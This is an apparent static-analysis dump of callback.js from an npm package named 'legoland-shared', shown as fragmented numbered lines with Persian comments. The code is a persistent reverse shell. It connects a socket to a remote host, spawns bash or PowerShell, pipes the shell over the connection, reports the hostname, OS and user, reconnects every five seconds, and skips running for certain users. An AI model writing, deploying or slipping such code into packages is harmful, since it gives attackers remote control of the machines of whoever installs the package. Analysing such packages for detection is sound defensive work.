// File: tmp/tmpww_4z60l/legoland-shared/package/callback.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_8 = require("child_process")
Line 3: const os = require("os")
Line 6: os.userInfo()
Line 7: {
    console.log(`[!] Skipping reverse shell for user: ${user}`);
    process.exit(0);
}
Line 8: console.log(`[!] Skipping reverse shell for user: ${user}`)
Line 9: process.exit(0)
Line 18: const client = new net.Socket()
Line 20: {
        console.log("[*] Reverse shell connected!");
        client.write(
            `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
        );

        // تشخیص OS و انتخاب shell مناسب
        let shell, shellArgs;
        if (process.platform === "win32") {
            shell = "powershell.exe";
            shellArgs = ["-NoLogo", "-NoProfile", "-Command", "-"];
        } else {
            shell = "/bin/bash";
            shellArgs = ["-i"];
        }

        const sh = spawn(shell, shellArgs, { stdio: ["pipe", "pipe", "pipe"] });

        // ارتباط دوطرفه
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        // جلوگیری از قطع شدن سریع
        sh.on("exit", (code) => {
            console.log(`[!] Shell exited with code ${code}. Reconnecting...`);
            setTimeout(connect, 5000);
        });

        // Ctrl+C handling
...
Line 21: console.log("[*] Reverse shell connected!")
Line 22: client.write(
            `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
        )
Line 23: `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
Line 24: <operator>.formatString("[*] Host: ", os.hostname(), " (", os.platform(), " ", os.release(), ")\n")
Line 25: <operator>.formatString("[*] User: ", user, "\n\n")
Line 30: {
            shell = "powershell.exe";
            shellArgs = ["-NoLogo", "-NoProfile", "-Command", "-"];
        }
Line 31: shell = "powershell.exe"
Line 32: shellArgs = ["-NoLogo", "-NoProfile", "-Command", "-"]
Line 33: {
            shell = "/bin/bash";
            shellArgs = ["-i"];
        }
Line 35: shellArgs = ["-i"]
Line 38: const sh = spawn(shell, shellArgs, { stdio: ["pipe", "pipe", "pipe"] })
Line 41: client.pipe(sh.stdin)
Line 42: sh.stdout.pipe(client)
Line 43: sh.stderr.pipe(client)
Line 46: {
            console.log(`[!] Shell exited with code ${code}. Reconnecting...`);
            setTimeout(connect, 5000);
        }
Line 47: console.log(`[!] Shell exited with code ${code}. Reconnecting...`)
Line 48: setTimeout(connect, 5000)
Line 53: data.toString().trim()
Line 54: sh.kill("SIGINT")
Line 59: {
        console.error(`[!] Connection error: ${err.message}. Retrying in 5s...`);
        setTimeout(connect, 5000);
    }
Line 60: console.error(`[!] Connection error: ${err.message}. Retrying in 5s...`)
Line 61: setTimeout(connect, 5000)
Line 64: {
        console.warn("[!] Disconnected. Reconnecting in 5s...");
        setTimeout(connect, 5000);
    }
Line 65: console.warn("[!] Disconnected. Reconnecting in 5s...")
Line 66: setTimeout(connect, 5000)
